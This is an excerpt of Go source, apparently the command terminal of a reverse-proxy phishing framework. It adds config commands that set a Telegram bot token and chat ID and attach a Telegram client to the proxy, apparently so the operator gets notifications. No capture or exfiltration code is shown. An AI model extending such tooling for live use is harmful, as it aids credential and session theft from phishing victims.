...
func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
	...
	if cfg.general.TelegramBotToken != "" && cfg.general.TelegramChatID != "" {
		if telegram, err := NewTelegram(cfg.general.TelegramBotToken, cfg.general.TelegramChatID); err == nil {
			t.telegram = telegram
			t.p.telegram = telegram // Update HttpProxy's reference
		} else {
			log.Error("failed to initialize Telegram: %v", err)
		}
	}
...
func (t *Terminal) handleConfig(args []string) error {
	if len(args) == 0 {
		keys := []string{"domain", "ipv4", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "telegram_bot_token", "telegram_chat_id"}
		vals := []string{
			t.cfg.general.Domain,
			t.cfg.general.OldIpv4,
			...
			t.cfg.general.TelegramBotToken,
			t.cfg.general.TelegramChatID,
		}
	...
	case "domain":
		if len(args) != 2 {
			return fmt.Errorf("usage: config domain <domain>")
		}
	...
	case "ipv4":
		if len(args) != 3 {
			return fmt.Errorf("usage: config ipv4 <external|bind> <ipv4_address>")
		}
		switch args[1] {
		case "external":
		...
		case "bind":
			...
			return nil
		default:
			return fmt.Errorf("invalid ipv4 type: %s", args[1])
		}
		
	case "https_port":
		if len(args) != 2 {
			return fmt.Errorf("usage: config https_port <port>")
		}
	...
	case "dns_port":
		if len(args) != 2 {
			return fmt.Errorf("usage: config dns_port <port>")
		}
		port, err := strconv.Atoi(args[1])
		if err != nil {
			return fmt.Errorf("invalid port number: %v", err)
	...
	case "unauth_url":
		if len(args) != 2 {
			return fmt.Errorf("usage: config unauth_url <url>")
		}
	...
	case "telegram":
		if len(args) != 2 {
			return fmt.Errorf("usage: config telegram <BOT_TOKEN:CHAT_ID>")
		}
		parts := strings.Split(args[1], ":")
		if len(parts) != 2 {
			return fmt.Errorf("invalid format. Use: config telegram \"BOT_TOKEN:CHAT_ID\"")
		}
		t.cfg.SetTelegramBotToken(parts[0])
		t.cfg.SetTelegramChatID(parts[1])
		// Reinitialize Telegram client
		if telegram, err := NewTelegram(parts[0], parts[1]); err != nil {
			log.Error("failed to initialize Telegram: %v", err)
		} else {
			t.telegram = telegram
			t.p.telegram = telegram // Update HttpProxy's reference
	...
	case "telegram_bot_token":
		if len(args) != 2 {
			return fmt.Errorf("usage: config telegram_bot_token <token>")
		}
		t.cfg.SetTelegramBotToken(args[1])
		// Reinitialize Telegram client
		if telegram, err := NewTelegram(args[1], t.cfg.general.TelegramChatID); err == nil {
			t.telegram = telegram
		}
		return nil
	...
	case "telegram_chat_id":
		if len(args) != 2 {
			return fmt.Errorf("usage: config telegram_chat_id <chat_id>")
		}
		t.cfg.SetTelegramChatID(args[1])
		// Reinitialize Telegram client
		if telegram, err := NewTelegram(t.cfg.general.TelegramBotToken, args[1]); err == nil {
			t.telegram = telegram
		}
		return nil
	}
...
func (t *Terminal) createHelp() {
	...
	h.AddSubCommand("config", []string{"telegram_bot_token"}, "telegram_bot_token <token>", "set Telegram bot token")
	h.AddSubCommand("config", []string{"telegram_chat_id"}, "telegram_chat_id <chat_id>", "set Telegram chat ID")
	h.AddSubCommand("config", []string{"telegram"}, "telegram <BOT_TOKEN:CHAT_ID>", "set both Telegram bot token and chat ID")
